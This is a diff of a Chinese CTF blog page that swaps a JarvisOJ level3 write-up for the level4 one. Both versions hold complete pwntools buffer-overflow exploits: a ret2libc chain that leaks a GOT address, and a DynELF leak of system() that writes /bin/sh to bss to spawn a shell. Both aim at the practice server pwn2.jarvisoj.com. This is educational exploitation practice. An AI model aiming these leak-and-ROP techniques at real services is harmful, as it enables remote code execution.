@@ -3,18 +3,18 @@
 <head>
   <meta charset="utf-8">
   
-  <title>JarvisOJ level3 | GoldsNow</title>
+  <title>JarvisOJ level4 | GoldsNow</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="这个题目虽然和前几个的结构差不多，但是减少了 system 和 /bin/sh ，而是给了一个libc.so 需要自己从里面找到地址">
+  <meta name="description" content="代码和上一题的几乎一模一样，就是lib文件没有给，这个时候就犯难了，然后网上找了一下，这个可以利用pwntools的DynELF来泄漏system的地址">
 <meta property="og:type" content="article">
-<meta property="og:title" content="JarvisOJ level3">
-<meta property="og:url" content="https://GoldsNow.github.io/2017/03/24/[JarvisOJ]level3/index.html">
+<meta property="og:title" content="JarvisOJ level4">
+<meta property="og:url" content="https://GoldsNow.github.io/2017/03/25/[JarvisOJ]level4/index.html">
 <meta property="og:site_name" content="GoldsNow">
-<meta property="og:description" content="这个题目虽然和前几个的结构差不多，但是减少了 system 和 /bin/sh ，而是给了一个libc.so 需要自己从里面找到地址">
-<meta property="og:updated_time" content="2017-03-24T15:21:02.469Z">
+<meta property="og:description" content="代码和上一题的几乎一模一样，就是lib文件没有给，这个时候就犯难了，然后网上找了一下，这个可以利用pwntools的DynELF来泄漏system的地址">
+<meta property="og:updated_time" content="2017-03-26T12:43:43.449Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="JarvisOJ level3">
-<meta name="twitter:description" content="这个题目虽然和前几个的结构差不多，但是减少了 system 和 /bin/sh ，而是给了一个libc.so 需要自己从里面找到地址">
+<meta name="twitter:title" content="JarvisOJ level4">
+<meta name="twitter:description" content="代码和上一题的几乎一模一样，就是lib文件没有给，这个时候就犯难了，然后网上找了一下，这个可以利用pwntools的DynELF来泄漏system的地址">
   
     <link rel="alternative" href="/atom.xml" title="GoldsNow" type="application/atom+xml">
   
@@ -220,11 +220,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-[JarvisOJ]level3" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-[JarvisOJ]level4" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/03/24/[JarvisOJ]level3/" class="article-date">
-      <time datetime="2017-03-24T14:49:00.000Z" itemprop="datePublished">2017-03-24</time>
+      <a href="/2017/03/25/[JarvisOJ]level4/" class="article-date">
+      <time datetime="2017-03-24T16:11:00.000Z" itemprop="datePublished">2017-03-25</time>
 </a>
     </div>
   
@@ -237,7 +237,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      JarvisOJ level3
+      JarvisOJ level4
     </h1>
   
 
@@ -262,51 +262,18 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>这个题目虽然和前几个的结构差不多，但是减少了 system 和 /bin/sh ，而是给了一个libc.so 需要自己从里面找到地址</p>
+        <p>代码和上一题的几乎一模一样，就是lib文件没有给，这个时候就犯难了，然后网上找了一下，这个可以利用pwntools的DynELF来泄漏system的地址</p>
 <a id="more"></a>
-<p>首先checksec下</p>
-<pre><code>gdb-peda$ checksec
-CANARY    : disabled
-FORTIFY   : disabled
-NX        : ENABLED
-PIE       : disabled
-RELRO     : Partial
-</code></pre><p>发现堆栈不可执行。</p>
-<p>这里就需要用到write函数来leak地址了。</p>
-<p>所以ret所对应的eip为 plt_write = 0x08048340</p>
-<p>使用write函数需要有三个参数，就是<code>ssize_t write(int fd,const void *buf,size_t nbytes)</code></p>
-<p>fd = 1 的时候是使用标准输入</p>
-<p>因为需要构造write来使得 read的真实地址泄漏<br>所以 我们使用write的三个参数为<code>1  got_read len(got_read)=4</code></p>
-<table>
-<thead>
-<tr>
-<th>stack</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>write</td>
-</tr>
-<tr>
-<td>addr_fun</td>
-</tr>
-<tr>
-<td>1</td>
-</tr>
-<tr>
-<td>read_got</td>
-</tr>
-<tr>
-<td>4</td>
-</tr>
-</tbody>
-</table>
-<p>这样子就可以leak read的真是地址，并且还能够在运行一次fun函数</p>
-<p>接下来就是找system的真实地址了。在libc里找</p>
-<p><code>system = libc_system - libc_read + true_read</code></p>
-<p>/bin/sh 可以通过 <code>strings -a -t x ./level3 | grep /bin/sh</code> 来找到地址，或者直接通过ida等工具</p>
-<p>最后通过的exp如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9879</span>)</div><div class="line"></div><div class="line">plt_write = <span class="number">0x08048340</span></div><div class="line">got_read  = <span class="number">0x0804A00C</span></div><div class="line">addr_func = <span class="number">0x0804844B</span></div><div class="line"></div><div class="line">shellcode = <span class="string">'A'</span>*<span class="number">0x88</span>+<span class="string">'bbbb'</span>+p32(plt_write)+p32(addr_func)+p32(<span class="number">1</span>)+p32(got_read)+p32(<span class="number">4</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</div><div class="line">p.sendline(shellcode)</div><div class="line"></div><div class="line">tmp = p.recv(<span class="number">4</span>)</div><div class="line"><span class="keyword">print</span> tmp</div><div class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</div><div class="line"></div><div class="line">addr_read = u32(tmp[<span class="number">0</span>:<span class="number">4</span>])</div><div class="line"><span class="keyword">print</span> <span class="string">'read_got ='</span>,addr_read</div><div class="line"></div><div class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</div><div class="line">libc_binsh = <span class="number">0x16084c</span></div><div class="line">addr_system = libc.symbols[<span class="string">'system'</span>]- libc.symbols[<span class="string">'read'</span>] + addr_read</div><div class="line">addr_binsh =  libc_binsh            - libc.symbols[<span class="string">'read'</span>] + addr_read</div><div class="line">addr_exit =   libc.symbols[<span class="string">'exit'</span>]  - libc.symbols[<span class="string">'read'</span>] + addr_read</div><div class="line"></div><div class="line">payload = <span class="string">'A'</span>*<span class="number">0x88</span>+<span class="string">'bbbb'</span>+p32(addr_system)+p32(addr_exit)+p32(addr_binsh)</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>DynELF的基本的使用模版是这样的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">p = process(<span class="string">'./xxx'</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></div><div class="line">  <span class="comment">#各种预处理</span></div><div class="line">  payload = <span class="string">"xxxxxxxx"</span> + address + <span class="string">"xxxxxxxx"</span></div><div class="line">  p.send(payload)</div><div class="line">  <span class="comment">#各种处理</span></div><div class="line">  data = p.recv(<span class="number">4</span>)</div><div class="line">  log.debug(<span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</div><div class="line">  <span class="keyword">return</span> data</div><div class="line">d = DynELF(leak, elf=ELF(<span class="string">"./xxx"</span>))      <span class="comment">#初始化DynELF模块 </span></div><div class="line">systemAddress = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)  <span class="comment">#在libc文件中搜索system函数的地址</span></div></pre></td></tr></table></figure>
+<p>这里构造payload为 <code>payload = &#39;A&#39;*0x88+&#39;BBBB&#39;+p32(plt_write)+p32(addr_func)+p32(1) + p32(address) + p32(length)</code></p>
+<p>就可以泄漏address的地址。</p>
+<p>知道了address的地址的话就简单很多了，只需要先用read在bbs写入/bin/sh然后再调用system就可以了</p>
+<p>最后的exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./level4'</span>)</div><div class="line">plt_write = elf.symbols[<span class="string">'write'</span>]</div><div class="line">plt_read = elf.symbols[<span class="string">'read'</span>]</div><div class="line"></div><div class="line">addr_func = <span class="number">0x0804844B</span></div><div class="line">addr_pppop = <span class="number">0x08048509</span></div><div class="line">addr_bbs = <span class="number">0x0804A027</span></div><div class="line"></div><div class="line"></div><div class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9880</span>)</div><div class="line"><span class="comment">#p = process('./level4')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></div><div class="line">  length = <span class="number">4</span></div><div class="line">  payload = <span class="string">'A'</span>*<span class="number">0x88</span>+<span class="string">'BBBB'</span>+p32(plt_write)+p32(addr_func)+p32(<span class="number">1</span>) + p32(address) + p32(length)</div><div class="line">  </div><div class="line">  p.send(payload)</div><div class="line"> </div><div class="line">  data = p.recv(<span class="number">4</span>)</div><div class="line">  <span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</div><div class="line">  <span class="keyword">return</span> data</div><div class="line"></div><div class="line"></div><div class="line">d = DynELF(leak, elf=ELF(<span class="string">"./level4"</span>))      <span class="comment"># init DynELF</span></div><div class="line">addr_system = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)  <span class="comment">#search system in libc</span></div><div class="line"> </div><div class="line"><span class="keyword">print</span> <span class="string">"system_addr="</span> + hex(addr_system)</div><div class="line"></div><div class="line">payload = <span class="string">'A'</span>*<span class="number">0x88</span>+<span class="string">'BBBB'</span>+p32(plt_read)+p32(addr_pppop)+p32(<span class="number">0</span>)+p32(addr_bbs)+p32(<span class="number">8</span>)+p32(addr_system)+p32(<span class="number">0</span>)+p32(addr_bbs)</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>参考文档</p>
+<p><a href="http://bobao.360.cn/learning/detail/3298.html?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="external">借助DynELF实现无libc的漏洞利用小结</a></p>
+
       
       
     </div>
@@ -315,13 +282,13 @@ RELRO     : Partial
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/03/24/[JarvisOJ]level3/">JarvisOJ level3</a></p>
+        <p><span>本文标题:</span><a href="/2017/03/25/[JarvisOJ]level4/">JarvisOJ level4</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 GoldsNow 的个人博客">GoldsNow</a></p>
-        <p><span>发布时间:</span>2017年03月24日 - 22时49分</p>
-        <p><span>最后更新:</span>2017年03月24日 - 23时21分</p>
+        <p><span>发布时间:</span>2017年03月25日 - 00时11分</p>
+        <p><span>最后更新:</span>2017年03月26日 - 20时43分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/03/24/[JarvisOJ]level3/" title="JarvisOJ level3">https://GoldsNow.github.io/2017/03/24/[JarvisOJ]level3/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://GoldsNow.github.io/2017/03/24/[JarvisOJ]level3/　　作者: GoldsNow" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/03/25/[JarvisOJ]level4/" title="JarvisOJ level4">https://GoldsNow.github.io/2017/03/25/[JarvisOJ]level4/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://GoldsNow.github.io/2017/03/25/[JarvisOJ]level4/　　作者: GoldsNow" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -334,18 +301,18 @@ RELRO     : Partial
 
 <nav id="article-nav">
   
-    <a href="/2017/03/25/[JarvisOJ]level4/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2017/03/25/[JarvisOJ]level3_x64/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          JarvisOJ level4
+          JarvisOJ level3_x64
         
       </div>
     </a>
   
   
-    <a href="/2017/03/24/[JarvisOJ]level0/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">JarvisOJ level0</div>
+    <a href="/2017/03/24/[JarvisOJ]level3/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">JarvisOJ level3</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -407,13 +374,13 @@ RELRO     : Partial
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/03/25/[JarvisOJ]level4/" title="上一篇: JarvisOJ level4">
+            <a href="/2017/03/25/[JarvisOJ]level3_x64/" title="上一篇: JarvisOJ level3_x64">
                 <i class="fa fa-angle-left"></i>
             </a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2017/03/24/[JarvisOJ]level0/" title="下一篇: JarvisOJ level0">
+            <a href="/2017/03/24/[JarvisOJ]level3/" title="下一篇: JarvisOJ level3">
                 <i class="fa fa-angle-right"></i>
             </a>
         
